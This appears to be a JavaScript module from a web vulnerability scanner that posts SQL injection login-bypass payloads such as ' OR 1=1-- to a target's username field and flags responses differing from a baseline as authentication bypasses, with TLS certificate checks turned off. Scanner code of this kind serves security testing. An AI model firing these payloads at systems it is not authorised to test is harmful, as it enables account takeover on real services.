import axios from 'axios';
import https from 'https';
import crypto from 'crypto';

const httpClient = axios.create({
    timeout: 10000,
    validateStatus: () => true,
    maxRedirects: 3,
    httpsAgent: new https.Agent({ rejectUnauthorized: false })
});

const AUTH_PAYLOADS = [
    "' OR 1=1--",
    "admin'--",
    "' OR 'a'='a",
    "\" OR 1=1--",
    "admin' #",
    "admin\" #",
];

export async function runDeterministicAuthBypass(targetInfo, onProgress = () => { }) {
    onProgress({
        phase: 'exploitation', status: 'running',
        message: `🛡️ Deterministic Auth Bypass started for ${targetInfo.endpoint}`
    });

    const url = targetInfo.endpoint;
    let baseResponse = null;

    try {
        baseResponse = await httpClient.post(url, { username: 'invalid_user_999', password: 'invalid_password' }, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
    } catch (err) {
        return [];
    }

    const baselineSize = baseResponse.data?.length || 0;
    const findings = [];

    for (const payload of AUTH_PAYLOADS) {
        try {
            const resp = await httpClient.post(url, { username: payload, password: 'password' }, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            });

            const respSize = resp.data?.length || 0;
            const diff = Math.abs(respSize - baselineSize);

            // If response changes significantly or gives a 302 redirect whereas baseline didn't
            const isBypass = (resp.status === 302 && baseResponse.status !== 302) ||
                (resp.status === 200 && baseResponse.status === 401) ||
                (diff > baselineSize * 0.1 && resp.status !== baseResponse.status);

            if (isBypass) {
                findings.push({
                    id: `RV-AUTH-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
                    type: 'Auth Bypass',
                    severity: 'High',
                    confidence: 'High Confidence',
                    endpoint: url,
                    param: 'username',
                    method: 'POST',
                    payload: payload,
                    evidence: {
                        baseline_status: baseResponse.status,
                        injected_status: resp.status,
                        baseline_size: baselineSize,
                        injected_size: respSize
                    },
                    owasp: 'A07:2021-Identification and Authentication Failures',
                    remediation: 'Use parameterized queries and robust backend authentication.',
                    impact: 'Complete account takeover or administrative access gained.',
                    confirmedAt: new Date().toISOString(),
                });
                onProgress({ phase: 'exploitation', status: 'finding', message: `🚨 Auth Bypass confirmed at ${url} using ${payload}` });
                break; // One is enough
            }
        } catch (e) {
            continue;
        }
    }

    if (findings.length === 0) {
        onProgress({ phase: 'exploitation', status: 'done', message: `🛡️ Auth Bypass tested ${AUTH_PAYLOADS.length} payloads, no bypass found.` });
    }

    return findings;
}
